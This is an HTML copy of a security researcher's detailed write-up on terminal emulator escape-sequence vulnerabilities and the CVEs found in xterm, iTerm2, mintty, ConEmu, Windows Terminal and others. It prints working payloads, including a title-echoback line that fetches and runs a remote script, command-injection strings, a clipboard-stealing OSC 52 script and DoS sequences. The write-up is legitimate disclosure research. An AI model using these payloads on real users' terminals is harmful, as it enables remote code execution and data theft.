<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://dgl.cx/2023/09/ansi-terminal-security">Original</a>
    <h1>&#34;&lt;ESC&gt;[31M&#34;? ANSI Terminal security in 2023 and finding 10 CVEs</h1>
    
    <div id="readability-page-1" class="page"><div id="container">
      
      <div id="content">

<article itemprop="text"><h2 id="terminal-security-in-2023" dir="auto">&#34;[31m&#34;?! ANSI Terminal security in 2023 and finding 10 CVEs</h2>
<p dir="auto">This paper reflects work done in late 2022 and 2023 to audit for
vulnerabilities in terminal emulators, with a focus on open source software.
The results of this work were 10 CVEs against terminal emulators that could
result in Remote Code Execution (RCE), in addition various other bugs and
hardening opportunities were found. The exact context and severity of these
vulnerabilities varied, but some form of code execution was found to be
possible on several common terminal emulators across the main client platforms
of today.</p>
<p dir="auto">Additionally several new ways to exploit these kind of vulnerabilities were
found.</p>

<p>This is the full technical write-up that assumes some familiarity with the subject matter, for a
 more gentle introduction see <a href="https://www.gresearch.com/blog/article/g-research-the-terminal-escapes/">my post on the G-Research
 site</a>.</p>

<h3 id="terminal-emulators" dir="auto"><a href="#terminal-emulators">Terminal emulators</a></h3>
<a href="https://youtu.be/Y4A7KMQEmfo"><img src="https://thewitchofendor.com/2023/09/vt100-defcon.jpg" width="479" height="258"/></a>
<p dir="auto">I will talk about terminal &#34;emulators&#34;. When people talk about emulators in this
context, they don&#39;t mean emulation in terms of actually emulating the hardware
(as now common with game consoles), but software re-implementations of physical
terminal devices. In this case these are mostly terminals from Digital Equipment
Corporation (DEC) such as the VT100 and later compatible (and extended)
terminals in the VT (Video Terminal) range which have become a defacto standard.</p>
<p dir="auto">There are many online resources about these terminals; I will go into some
necessary detail later, but if you are interested to read more background
<a href="http://vt100.net">vt100.net</a> is a great resource.</p>
<h3 id="past-work" dir="auto"><a href="#past-work">Past work</a></h3>
<p dir="auto"><em>&#34;Those who cannot remember the past are condemned to repeat it.&#34;</em></p>
<p dir="auto">In a <a href="http://phrack.org/issues/46/4.html">1994 issue of phrack</a> there is
&#34;flash.c&#34; -- this floods a user&#39;s terminal with escape sequences, making it
flash. This is one of the first references I can find to using this to attack
users, however it was definitely known before then. The attack is interesting
as it uses the talk protocol (which through <code>talkd</code> could write to a user&#39;s
terminal at any time, to let them know another (potentially remote) user wished
to &#34;talk&#34; to them.  This is now clearly a historical relic, but as I&#39;ll show
finding a way to write raw data to a user&#39;s terminal is the first step in the
modern versions of these attacks.</p>
<p dir="auto">Moving on to this century, in 2003 HD Moore released a paper: <a href="https://marc.info/?l=bugtraq&amp;m=104612710031920&amp;w=2">&#34;Terminal
Emulator Security Issues&#34;</a>. This is the first write-up I can find of the
potential issues with terminal security, that includes more than just DoS
attacks. It&#39;s worth mentioning this paper includes CVE candidates, e.g.
&#34;CAN-2003-0063&#34;, as at the time CVEs were relatively new. This also means
tracking historical vulnerabilities before this point is harder.</p>
<p dir="auto">In 2008 Paul Szabo found a vulnerability in xterm (<a href="http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=510030">CVE-2008-2383</a>). This is one
of the first published examples I know of, of what I call a &#34;full echoback&#34;
vulnerability, where it&#39;s possible to insert control characters into the input stream.</p>
<p dir="auto">More modern is <a href="https://trojansource.codes/">trojan source</a> which similarly to
hidden escape sequences, uses Unicode control characters to hide some text; for
example by using Unicode&#39;s Right-to-Left Override (RTLO). This paper will only
cover Unicode as it relates to terminals, for more details on Unicode Source
Code Handling see <a href="https://www.unicode.org/reports/tr55/">Unicode Technical Standard
#55</a>.</p>
<h2 id="escape-sequence-overview" dir="auto"><a href="#escape-sequence-overview">Escape sequence overview</a></h2>
<p dir="auto">Escape sequences were originally defined in <a href="https://en.wikipedia.org/wiki/ANSI_escape_code">ANSI X3.64</a>, that is the ANSI standard
 on &#34;Additional Controls For Use With American National Standard Code for Information Interchange&#34;
 -- this builds on characters defined in the ASCII standard to provide control for display and
 printer devices. Which is a wordy way to say this is all based on an old standard; not a bad thing,
 it works, but it does mean there is a lot of things done in ways which wouldn&#39;t be the case in a
 modern standard.</p>
<p dir="auto">Escape sequences can be used for many control purposes, including changing
colors, moving around the screen and querying the state of the terminal.</p>
<p dir="auto">Many end users use a terminal without needing to understand escape sequences,
but just like HTML, they are there and &#34;view source&#34; while not as obvious as a
context menu click is quite easy. The <code>cat</code> command has a <code>-v</code> flag which can
be used to perform escaping. This can be simply combined with Unix pipes to see
the raw output from some commands, for example <code>cmatrix | cat -v</code> will show the
output from <a href="https://github.com/abishekvashok/cmatrix">cmatrix</a> -- a console,
screensaver-like implementation of the Matrix animation.</p>
<p dir="auto">(Aside: <code>cat -v</code> was added in BSD Unix, to some annoyance of the Bell Labs Unix
team, see <a href="https://harmful.cat-v.org/cat-v/">cat -v considered harmful</a> (1983).
Alternatives include <code>sed -u -e &#39;l&#39;</code> and <code>vis</code> in BSDs.)</p>
<p dir="auto">For commands which need interactivity the simple <code>cat -v</code> approach won&#39;t work,
many Unixes have a <code>script</code> command which can be used to save the full terminal
output to a file. The <code>script</code> command is sadly not standardised, some versions
support timestamps to allow replay of these saved files. (There is also
<a href="https://asciinema.org/">asciinema</a> which can be used like <code>script</code> but
provides a more modern interface, including a browser based player.)</p>
<h2 id="classes-of-vulnerability" dir="auto"><a href="#classes-of-vulnerability">Classes of vulnerability</a></h2>
<p dir="auto">In order to understand the risk from these particular vulnerabilities and how
they could be exploited I&#39;ll classify them into some classes.</p>
<h3 id="misuse-of-escape-sequences" dir="auto"><a href="#misuse-of-escape-sequences">Misuse of escape sequences</a></h3>
<p dir="auto">This is where an attacker can get an escape sequence written to a user&#39;s
terminal and the terminal behaves as expected when that sequence is written to
it.</p>
<p dir="auto">A simple example is <code>curl</code> -- it will in most cases simply write ASCII data to a
terminal (it has some detection for binary data, but does not filter all data,
and the test for binary data can be easily defeated, as it isn&#39;t intended to
serve a security purpose and simply looks for NULs).</p>
<p dir="auto">This is a vulnerability when it would be reasonable for the user to expect
escaping to happen. The most simple way to reason about this is to consider the
backspace character, if raw ASCII is printed then even without terminal escapes
it is possible to disguise the output.</p>
<p dir="auto">There are cases where this can be used to hide text, for example:</p>
<pre><code>$ printf &#34;echo evil #\b\b\b\b\b\bgood  \n&#34; &gt; evil.sh
$ cat evil.sh
echo good  
$ sh evil.sh
evil
</code></pre>
<p dir="auto">Additionally standard tools like <code>less</code> take backspaces into account, so in some
cases text can easily be hidden when viewed with less, as is the default for
<code>git diff</code> among other tools. (You can use less -U to see controls, but
unfortunately that also includes tabs so isn&#39;t generally usable on source code.
This can be improved, see <a href="https://github.com/gwsw/less/issues/335">less issue
#335</a> which adds a <code>--proc-tab</code> option
to allow tabs to be processed, but not other control characters.</p>
<p dir="auto">In code the safest way to print unknown text is to use the C <code>isprint()</code>
function, and only output printable characters. Note that is not usually what
is actually wanted, as often newlines at least will need to be included in the
output.</p>
<p dir="auto">A good compromise is to only escape the terminal control characters (ESC,
character 27) This provides defence in depth for the security issues described
in this paper, but does not protect against confusion attacks.</p>
<p dir="auto">An interesting area is terminals that accept C1 controls (8-bit, e.g. <a href="https://www.compart.com/en/unicode/U+009B">U+009B</a>), many do not accept these controls,
particularly as how they interact with UTF-8 is un(der)specified. VTE based terminals, Kitty and
WezTerm are some of the few terminals that accept C1 controls by default, within UTF-8 encoded data.
My recommendation would be to not use these terminals with untrusted data.</p>
<p dir="auto">As mentioned flash.c was published in Phrack in 1994. The entry point via
<code>talkd</code> is no longer relevant, but if we can deliver the escape sequences it
uses to a terminal, the result still possible, as this isn&#39;t a vulnerability,
it is simply expected VT behavior.</p>
<pre><code># This simulates the effect of receiving &#34;flash&#34;, a 1994 terminal DoS attack.
while :; do
  printf &#34;\033c\033(0\033#8&#34;
  sleep 0.1
  printf &#34;\033[1;3r\033[J&#34;
  sleep 0.1
  printf &#34;\033[5m\033[?5h&#34;
  sleep 0.1
done</code></pre>
<p dir="auto"><em>If you need to look-up an escape sequence the <a href="https://invisible-island.net/xterm/ctlseqs/ctlseqs.html">xterm ctlseq
reference</a> is quite
good and documents all the sequences xterm supports.</em></p>
<p dir="auto">To break that down:</p>
<ul dir="auto">
<li>First line:
<ul dir="auto">
<li><code>ESC c</code>
Full Reset (RIS)</li>
<li><code>ESC ( 0</code>
Designate G0 Character Set, where 0 means &#34;DEC Special Character and Line Drawing Set&#34; from the VT100</li>
<li><code>ESC # 8</code>
DEC Screen Alignment Test (DECALN), fully fills the screen with &#34;E&#34; characters</li>
</ul>
</li>
<li>Second line:
<ul dir="auto">
<li><code>ESC [1;3r</code> Set Scrolling Region (DECSTBM), limits the scrolling area to the top 3 lines of the screen.</li>
<li><code>ESC [J</code> Erase in Display (ED), as the terminal has been reset the cursor is at the top left, so this erase below actually erases the whole display. Between this and the screen alignment test is what causes the flashing.</li>
</ul>
</li>
<li>Third line:
<ul dir="auto">
<li><code>ESC [5m</code> Select Graphic Rendition (SGR), 5 (blink). This doesn&#39;t actually do anything as it doesn&#39;t print any normal characters between this and the reset.</li>
<li><code>ESC [?5h</code> Reverse Video (DECSCNM), this swaps the background and foreground.</li>
</ul>
</li>
</ul>
<p dir="auto">As you can see there&#39;s lots of possibilities here, changing the character set is
particularly nasty as something like <code>hello world</code> will become <code>  ␤␊┌┌⎺ ┬⎺⎼┌␍</code>.</p>
<p dir="auto">There are additional things such as using invisible attributes (SGR 8, supported
by some terminals), the same color for the foreground and background which can
be used to hide text from a victim, or at least annoy them.</p>
<p dir="auto">Additionally modern terminals support escape sequences related to the
environment they run within, for example setting the title, getting the size of
the window and mouse reporting. As we&#39;ll see some of those can lead to trouble.</p>
<p dir="auto"><a href="https://cwe.mitre.org/data/definitions/150.html">CWE-150</a> contains some
further references to CVEs where incorrect or missing terminal escaping led to
bugs.</p>
<h3 id="queries-and-echoback" dir="auto"><a href="#queries-and-echoback">Queries and Echoback</a></h3>
<p dir="auto">Escape sequences are used both for sending data to the terminal (e.g.
changing color, sending queries), as well as receiving data from the terminal
(e.g. special key presses, replies to queries).</p>
<p dir="auto">Queries are particularly interesting, as they are one of the main ways a
terminal can be exploited. In particular some queries make it possible to query
for a state the attack may control; the first known write-up of this is in <a href="https://marc.info/?l=bugtraq&amp;m=104612710031920&amp;w=2">HD
Moore&#39;s work in 2003</a>.</p>
<p dir="auto">HD Moore&#39;s example is:</p>
<pre><code>echo -e &#34;\e]2;;wget 127.0.0.1/.bd;sh .bd;exit;\a\e[21t\e]2;xterm\aPress Enter&gt;\e[8m;&#34;
</code></pre>
<p dir="auto">This sets the title to a wget command and then runs the shell script
downloaded. It asks for the title to be reported, then sets the text to be
invisible.</p>
<p dir="auto">Since then nearly all terminals disable title reporting by default (but some do
have an option to enable it). However I found several terminals in 2022 that
did enable it by default.</p>
<ul dir="auto">
<li>
<p dir="auto">WezTerm: Disabled in: <a href="https://github.com/wez/wezterm/commit/e70f97903b8e5de8e918b9d9a1c68f80a1977425">https://github.com/wez/wezterm/commit/e70f97903b8e5de8e918b9d9a1c68f80a1977425</a></p>
<p dir="auto">This meant the unmodified command from 2003 worked against WezTerm. However
WezTerm correctly implements the VT100 state machine, so this was only a
&#34;limited echoback&#34; attack.</p>
</li>
<li>
<p dir="auto">SwiftTerm: Similar to WezTerm, disabled in: <a href="https://github.com/migueldeicaza/SwiftTerm/commit/a94e6b24d24ce9680ad79884992e1dff8e150a31">https://github.com/migueldeicaza/SwiftTerm/commit/a94e6b24d24ce9680ad79884992e1dff8e150a31</a></p>
</li>
<li>
<p dir="auto">ConEmu: Tracked in <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-46387">CVE-2022-46387</a> and <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-39150">CVE-2023-39150</a></p>
<p dir="auto">The difference with the ConEmu variant of the title bug, is because it accepted
control characters, it was possible to run commands without any user
interaction. If an attacker could find a way to write to the terminal, they
could almost certainly execute commands. Additionally the first fix did not
fully fix the issue -- the author disabled certain control characters only (one
control character that can bypass this is ^O which GNU readline uses as &#34;accept
and history next&#34;, which clink, as shipped with Cmder enables by default) --
the fixed version fixes the no-user-interaction version but is still
technically vulnerable to the 2003 attack version (the author for some reason
doesn&#39;t seem to want to just remove the feature, I even offered a patch which
disabled it).</p>
</li>
</ul>

<iframe title="ConEmu CVE-2023-39150 and DNS" width="500" height="281" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture;
web-share" allowfullscreen="" src="https://www.youtube-nocookie.com/embed/UXP3X2ofF8c?feature=oembed"></iframe>

<p dir="auto">I am calling this class of attack as found against ConEmu a &#34;full echoback&#34;,
i.e. the attacker can fully control the sequences that are echoed back
(including newlines and Control-C). Although not escape (except in iTerm2, which
supports two escape characters to escape escape in some contexts).</p>
<p dir="auto">I am using the word &#34;echoback&#34; to describe cases where a terminal will respond
with some data that is sent to it.</p>
<p dir="auto">It is also possible to use some built in terminal queries to make the terminal
write predictable text to the input stream. Usually these do not include a
newline character, so are limited and not controlled by the attacker. (An
exception is rxvt-unicode
<a href="https://nvd.nist.gov/vuln/detail/CVE-2021-33477">CVE-2021-33477</a>. However it
is possible to make the terminal reply with strings like &#34;rgb:xxx/xxx/xxx&#34;,
which are somewhat attacker controllable; for example if an attacker can create
a file at a particular path they may be able to attack the user. This is
discussed later.</p>
<p dir="auto">A further example of using escape sequences in unexpected ways can be found in
solid-snail&#39;s research. They disclosed two issues in iTerm2:
<a href="https://blog.solidsnail.com/posts/2023-08-28-iterm2-rce">https://blog.solidsnail.com/posts/2023-08-28-iterm2-rce</a> -- they had
independently discovered some of the ideas like using &#34;rgb:.../&#34; as a file path.</p>
<h3 id="buffer-overflow-in-parsing" dir="auto"><a href="#buffer-overflow-in-parsing">Buffer overflow in parsing</a></h3>
<p dir="auto">A terminal is dealing with parsing a lot of data and are commonly written in
memory unsafe languages, so it is not surprising to find buffer overflows.</p>
<p dir="auto">One particular example is Sixel which is the DEC graphics format. It has had
various overflows in the past, for example in its implementation in xterm and in
libraries such as libsixel.</p>
<p dir="auto">xterm <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-24130">CVE-2022-24130</a> was
found by Nick Black. This was a flaw in the repeat operator that is present in
the Sixel format and there was no bounds checking on the operator, for example:</p>
<pre><code>printf &#39;\ePq#1;1;1#1!99999999@\e\\\n&#39;
</code></pre>
<p dir="auto">Will crash xterm before the fix. I spent some time fuzzing xterm and found one
more Sixel issue, which is fixed in xterm 380 (along with several other bugs I
found).</p>
<h3 id="lack-of-escaping-in-processing" dir="auto"><a href="#lack-of-escaping-in-processing">Lack of escaping in processing</a></h3>
<p dir="auto">It is common for the strings sent via OSC to be further processed by terminals.
There have been several cases where this results in a terminal not escaping the
input sent to the terminal when it is further processed, e.g. running a
command.</p>
<h4 id="windows-terminal--wsl-cve-2022-44702" dir="auto"><a href="#windows-terminal--wsl-cve-2022-44702">Windows Terminal + WSL </a><a href="https://github.com/microsoft/terminal/releases/tag/v1.15.2874.0">CVE-2022-44702</a></h4>
<p dir="auto">By using the ConEmu specific escape sequence OSC 9;9 to set a working directory
that contained a <code>&#34;</code>, it was possible to run an arbitrary command when a WSL
tab was duplicated (ctrl+shift+d, or context menu item).</p>
<p dir="auto">The exploit for this is to arrange for this string to be sent to the victim&#39;s terminal:</p>
<pre><code>printf &#34;\e]9;9;/\&#34; sh -c &#39;calc.exe &amp;&amp; cd &amp;&amp; exec \$SHELL&#39; -- \&#34;o /\a&#34;
</code></pre>
<p dir="auto">Then when the victim duplicates the tab (assuming they&#39;ve not configured the
shell working directory integration, which will undo the exploit) it will open
calculator.</p>

<p dir="auto">This was <a href="https://youtu.be/iIHw0KWgzAs?t=1104">demonstrated in my BlueHat
talk</a> (a version is embedded below, too).</p>
<h4 id="rxvt-unicode-background-osc-cve-2022-4170" dir="auto"><a href="#rxvt-unicode-background-osc-cve-2022-4170">rxvt-unicode background OSC </a><a href="https://www.openwall.com/lists/oss-security/2022/12/05/1">CVE-2022-4170</a></h4>
<p dir="auto">This was a fun one, the terminal supports a custom OSC for setting the
background, which it turned into its own special configuration language, which
was &#39;eval&#39;ed as Perl code, while it tried to quote the input, it didn&#39;t do it
correctly.</p>
<p dir="auto">Rather than write it again, I quote the
<a href="https://www.openwall.com/lists/oss-security/2022/12/05/1">advisory</a> I sent to
oss-security below:</p>
<pre><code>The &#34;background&#34; extension is automatically loaded if certain X
resources are set such as &#39;transparent&#39; (see the full list at the top
of src/perl/background[1]). So it is possible to be using this
extension without realising it.

This is accidentally fixed on version 9.30, and I haven&#39;t confirmed
9.29, it appears to not be exploitable, but only due to another (not
security) bug. The actual bug which makes this not vulnerable on 9.30
is simply a wrong number in &#34;on_osc_seq&#34;.

For 9.25 and 9.26 the patch at[2] can be backported. The body of the fix is:

 sub q0 {
-   (my $str = shift) =~ s/\x00//g; # make sure there really aren&#39;t
any embedded NULs
-   &#34;q\x00$str\x00&#34;
+   &#34;qq\x00\Q$_[0]\E\x00&#34;
 }

Isn&#39;t Perl quoting fun? Paranoid people may wish to remove the entire
&#34;on_osc_seq&#34; subroutine to avoid passing any potentially untrusted
input anywhere near eval (this feature is deprecated and the
maintainer did mention they are considering what to do longer term).

It doesn&#39;t make sense to withhold an exploit for this; the fix gives a
pretty good idea where to look and this isn&#39;t vulnerable in the latest
version.

$ urxvt -transparent

Inside that running terminal:

# Make tint be &#34;\\&#34;, which means the ending \x00 is quoted under our control
$ printf &#39;\e]705;\\\a&#39;
# Make the second q0 end the quoted q-string and then be valid perl
under our control
$ printf &#39;\e]20;,rootalign root),`touch /tmp/cve-2022-4170` #\a&#39;

</code></pre>

<p>The Windows Terminal and rxvt-unicode examples are two I found, there have been other
vulnerablities, for example <a href="https://carter.sande.duodecima.technology/">Carter Sande</a>
found <a href="https://bugs.gentoo.org/868543">CVE-2022-41322</a> in Kitty, where the OSC to
generate desktop notifications could be abused in a similar way.</p>

<h3 id="dos" dir="auto"><a href="#dos">DoS</a></h3>
<p dir="auto">There are many possibilities for Denial-of-Service. These are less interesting
as really they are an inconvenience, the user can recover fairly quickly in
most cases, although in some cases they may be persistent, which means the user
may clean up and hide other tracks of an attacker or similar.</p>
<h4 id="iterm2-rep" dir="auto"><a href="#iterm2-rep">iTerm2 REP</a></h4>
<p dir="auto">This uses the ANSI repeat sequence, to repeat a character many times, which
resulted in the terminal running out of memory (and &#34;beachballing&#34;).</p>
<p dir="auto">Simple example:</p>
<pre><code>perl -le&#39;print &#34;x\e[2000000000b&#34;&#39;
</code></pre>
<p dir="auto">This was fixed in <a href="https://github.com/gnachman/iTerm2/commit/438fe6000">https://github.com/gnachman/iTerm2/commit/438fe6000</a></p>
<p dir="auto">Pretty amusing, but not really an issue except to crash the terminal. This was
further covered by <a href="https://www.youtube.com/watch?v=3T2Al3jdY38">STÖK in his
talk</a>, where for example emojis
result in more memory usage in some cases. Some terminals are still vulnerable
to this or minor variants.</p>
<h4 id="windows-terminal-osc8-hyperlink" dir="auto"><a href="#windows-terminal-osc8-hyperlink">Windows Terminal OSC8 (hyperlink)</a></h4>
<p dir="auto">A long URL could result in a crash when the tooltip was displayed. The displayed
URL length is now limited.</p>
<h4 id="openbsd-console-dos" dir="auto"><a href="#openbsd-console-dos">OpenBSD: Console DoS</a></h4>
<p dir="auto">This was via overflows on parameters. Also affected NetBSD. Can give limited
memory write, may be exploitable on 32-bit, if a kernel memory address info leak
is found.</p>
<p dir="auto">Fix: <a href="https://ftp.openbsd.org/pub/OpenBSD/patches/7.2/common/021_wscons.patch.sig">https://ftp.openbsd.org/pub/OpenBSD/patches/7.2/common/021_wscons.patch.sig</a></p>
<p dir="auto">Some exploits for these are:</p>
<pre><code>printf &#39;\eP2$t99999999\e\\&#39;
printf &#39;\e[0;10r\e[20d\e[2000Bx&#39;
printf &#39;\e[0;2r\e[5f\e[2000M&#39;
</code></pre>
<p dir="auto">I also found a later issue where the escape sequence parameter parsing itself
could be overflowed, this was fixed in:
<a href="https://ftp.openbsd.org/pub/OpenBSD/patches/7.3/common/014_wscons.patch.sig">https://ftp.openbsd.org/pub/OpenBSD/patches/7.3/common/014_wscons.patch.sig</a> (this one was also assigned <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-40216">CVE-2023-40216</a></p>
<p dir="auto">An exploit that crashes this looks something like:</p>
<pre><code>perl -e&#39;print &#34;\e[&#34;; print &#34;;&#34; x 128 for 1 .. 2**24; print &#34;;;;;31m\n&#34;&#39; &gt; bigesc
cat bigesc
</code></pre>
<p dir="auto">(Yes, that&#39;s ~2GiB of semicolons.)</p>
<h4 id="setting-icons" dir="auto"><a href="#setting-icons">Setting icons</a></h4>
<p dir="auto">For example xterm can load icons from local filesystem in response to an OSC.
This led to a local xterm DoS being possible through XPM via <a href="https://nvd.nist.gov/vuln/detail/cve-2022-46285">CVE-2022-46285</a>:</p>
<pre><code>printf &#34;/* XPM */\n/*&#34; &gt; /tmp/f
printf &#34;\e]I/tmp/f\a&#34;
</code></pre>
<h4 id="cyberarks-research-dos-via-fast-title-updates" dir="auto"><a href="#cyberarks-research-dos-via-fast-title-updates">CyberARK&#39;s research: DoS via fast title updates</a></h4>
<p dir="auto">This was discovered by Evitar Gerzi, and covered in the <a href="https://www.cyberark.com/resources/threat-research-blog/dont-trust-this-title-abusing-terminal-emulators-with-ansi-escape-characters">CyberARK blog
post</a>.</p>
<h3 id="leaks" dir="auto"><a href="#leaks">Leaks</a></h3>
<p dir="auto">There are some ways that terminals can leak data unexpectedly, and possibly in
a way that is invisible to the user.</p>
<h4 id="xterm-osc-52-clipboard" dir="auto"><a href="#xterm-osc-52-clipboard">xterm OSC 52 (clipboard)</a></h4>
<p dir="auto">xterm implements OSC 52 for reading and writing the clipboard. The upstream
default is to enable this, luckily many distributions set this off by default
(Debian, Red Hat, OpenBSD). A privileged remote attacker can do this in the
background, i.e. watch a user&#39;s clipboard over SSH.</p>
<p dir="auto">For example:</p>
<pre><code>#!/bin/bash
# Clipboard read via OSC 52
# David Leadbeater, 2023 &lt;https://dgl.cx/0bsd&gt;
pid=${1:?$&#39;\e&#39;&#34;[GUsage: $0 pid-of-shell&#34;}

tty=&#34;/dev/$(ps -otty -p$pid | tail -1)&#34;

kill -STOP $pid
trap &#34;kill -CONT $pid&#34; EXIT

printf &#34;\e]52;sc;?\a&#34; &gt; $tty
read -d &#34;$(printf &#34;\a&#34;)&#34; x &lt; $tty
cut -d&#39;;&#39; -f3 &lt;&lt;&lt;&#34;$x&#34; | base64 -d
</code></pre>
<p dir="auto">Running this script against a PID of a shell connected to the system using
xterm will report the terminal&#39;s clipboard contents.</p>
<p dir="auto">Few other terminals support reading the clipboard. However some support
writing, this is less of a concern, but one potential attack is a remote
attacker who has compromised a remote system could put something different on a
user&#39;s clipboard unexpectedly (in most cases this will also work when the
terminal is in the background).</p>
<h4 id="cursor-checksum" dir="auto"><a href="#cursor-checksum">Cursor checksum</a></h4>
<p dir="auto">It is possible to ask for the cursor checksum using DECRQCRA. By asking for a
single character on the screen at a time, that character will be revealed.
One potential attack here is reading what is displayed on the terminal before
a user SSHes to a remote system. It can be done in a similar way to the
clipboard reading script above.</p>
<p dir="auto">Few terminals support this and those that do either prompt the user or have
it disabled. There is value in supporting it as it allows for automated
testing of terminal behaviour, but it should only be used for tests and not
enabled all the time.</p>
<h4 id="apple-terminal-dns-leaks" dir="auto"><a href="#apple-terminal-dns-leaks">Apple Terminal DNS leaks</a></h4>
<p dir="auto">Apple Terminal supports OSC 7 for setting the working directory. The idea is
the terminal can track which directory the user has changed into and then when
creating a new tab it will automatically change to that directory.</p>
<p dir="auto">The implementation is a <code>file://</code> URL and in order to work out if the URL is
local or not it appears to do a DNS lookup. This means by simply outputting something like:</p>
<pre><code>printf &#34;\e]7;file://some.thing.example.com/\a&#34;
</code></pre>
<p dir="auto">The terminal will do a DNS lookup on <code>some.thing.example.com</code> to check whether
that resolves to one of the machine&#39;s IP addresses. There are a few uses of
this, one as a canary put into logs to see if the user is reading logs in a way
that they aren&#39;t escaped or as a way to leak content from a more secure system
(without internet access) to the internet via DNS going through the user&#39;s
client device.</p>
<p dir="auto">(This was discussed in my <a href="https://youtu.be/Y4A7KMQEmfo?t=1923">DEF CON 31 talk</a>
too.)</p>
<h2 id="echoback-vulnerabilities-in-detail" dir="auto"><a href="#echoback-vulnerabilities-in-detail">Echoback vulnerabilities in detail</a></h2>
<h3 id="xterm-font-osc-50-query" dir="auto"><a href="#xterm-font-osc-50-query">xterm font (OSC 50 query)</a></h3>
<p dir="auto">This is a limited echoback. I discovered an interesting interaction with Zsh
where ^G is bound by default to list-expand. This means a string like <code>$(ls)</code>
will run the command when ^G is pressed.</p>
<p dir="auto">From my post to <a href="https://www.openwall.com/lists/oss-security/2022/11/10/1">oss-security</a>:</p>
<pre><code>The issue is in the OSC 50 sequence, which is for setting and querying
the font. If a given font does not exist, it is not set, but a query
will return the name that was set. Control characters can&#39;t be
included, but the response string can be terminated with ^G. This
essentially gives us a primitive for echoing text back to the terminal
and ending it with ^G.

It so happens ^G is in Zsh when in vi line editing mode bound to
&#34;list-expand&#34;. Which can run commands as part of the expansion leading
to command execution without pressing enter!

This does mean to exploit this vulnerability the user needs to be
using Zsh in vi line editing mode (usually via $EDITOR having &#34;vi&#34; in
it). While somewhat obscure this is not a totally unknown
configuration.

In that configuration, something like:
printf &#34;\e]50;i\$(touch /tmp/hack-like-its-1999)\a\e]50;?\a&#34; &gt; cve-2022-45063
cat cve-2022-45063  # or another way to deliver this to the victim

Will touch that file. It will leave the line on the user&#39;s screen;
I&#39;ll leave it as an exercise for the reader to use the vi line editing
commands to hide the evidence.

Debian, Red Hat and others disable font ops by default.
[...]
Additionally upstream xterm does not disable them by default, so some
distributions include a vulnerable default configuration.
</code></pre>
<p dir="auto">(Demo in <a href="https://youtu.be/4kfDBNzStbs?t=1529">Everything Open Talk</a>.)</p>
<p dir="auto">This bug in xterm was assigned <a href="https://www.openwall.com/lists/oss-security/2022/11/10/1">CVE-2022-45063</a>, it was fixed in xterm patch #375.</p>
<p dir="auto">I found an interesting variant of this in mintty, which also implements OSC 50,
including the query capability, but it echoed back exactly what was sent -- a
full echoback (i.e. any character could be injected, leading to potential code
execution if an attacker can write unescaped output to the terminal). The
details for DECRQSS below therefore also apply to this issue
in mintty.</p>
<p dir="auto">This variant in mintty was assigned <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-39726">CVE-2023-39726</a>, it was fixed in mintty
version 3.6.5.</p>
<h3 id="decrqss" dir="auto"><a href="#decrqss">DECRQSS</a></h3>
<p dir="auto">This vulnerability was first reported in xterm in 2008, tracked as
<a href="https://nvd.nist.gov/vuln/detail/CVE-2008-2383">CVE-2008-2383</a>.</p>
<p dir="auto">An interesting detail of this is we now have easy access to the DEC manuals and
they confirm that there should be no reply to an invalid request. (But note
that there was a mistake in the documentation, as the response code was
backwards). I have confirmed on a real VT520 that it does not ever return any
user controllable text for an unknown DECRQSS sequence.</p>
<p dir="auto">Which means this somehow is a difference that was introduced into the xterm
control sequence documentation, which unfortunately multiple terminal emulators
then faithfully reimplemented. The xterm documentation has now been fixed (in
2023).</p>
<p dir="auto">The issue is a terminal can echoback the data sent to it. In this case the
severity varies in different terminals.</p>
<h4 id="iterm2" dir="auto"><a href="#iterm2">iTerm2</a></h4>
<p dir="auto">iTerm2 <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-45872">CVE-2022-45872</a> resulted in a near full echoback. The only condition
that must be met is any control character has to be the last character in the
escape sequence. But it is possible to send multiple escape sequences, and in
some cases iTerm2 will appear to buffer the output until a final DECRQSS
sequence is sent without any control characters.</p>
<p dir="auto">This was fixed in iTerm2 3.4.18.</p>


<h4 id="mintty" dir="auto"><a href="#mintty">mintty</a></h4>
<p dir="auto">mintty <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-47583">CVE-2022-47583</a>
resulted in a full echoback (i.e. any character could be injected, leading to
potential code execution if an attacker can write unescaped output to the
terminal). It was fixed in mintty
3.6.3 (<a href="https://github.com/mintty/mintty/commit/cabe4b1c8f0595ad414d19546bb8f25942cc8f01">part of this commit</a>).</p>

<p>See <a href="#less">&#34;less&#34; below</a> for a demo using this bug to run an
attacker controlled command when the user merely types &#34;git log&#34;.</p>

<h4 id="swiftterm" dir="auto"><a href="#swiftterm">SwiftTerm</a></h4>
<p dir="auto"><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-23465">CVE-2022-23465</a> was also a full echoback.</p>
<h4 id="kitty"><a href="#kitty">Kitty</a></h4>
Kitty had a variant which allowed non-control characters to be echoed back (a limited echoback).
This was not assigned a CVE.
It was fixed in <a href="https://github.com/kovidgoyal/kitty/commit/60a7a53ccdac88dc728ac4f9e9295d64990e868c">this commit</a>.
<h4 id="libvterm" dir="auto"><a href="#libvterm">libvterm</a></h4>
<p dir="auto">This did not receive a CVE, it only allowed echoing back around 3 characters.
As this library is embedded into Vim and Neovim, there were possible ways it
could be attacked via Vi mode.</p>
<p dir="auto"><a href="https://huntr.dev/bounties/79291944-5c63-4955-88d2-21a6120d12fa/">Report on huntr.dev</a>.</p>
<h4 id="zutty" dir="auto"><a href="#zutty">zutty</a></h4>
<p dir="auto">I did not find this one, credit to <a href="https://carter.sande.duodecima.technology/">Carter
Sande</a> for finding
<a href="https://bugs.gentoo.org/868495">CVE-2022-41138</a>.</p>
<p dir="auto">This one has some limits on the length of the string, but could be exploited in
a similar way to the others, aside from very long strings.</p>

<p dir="auto">Even with the fixes above there are cases where a terminal will reply with a
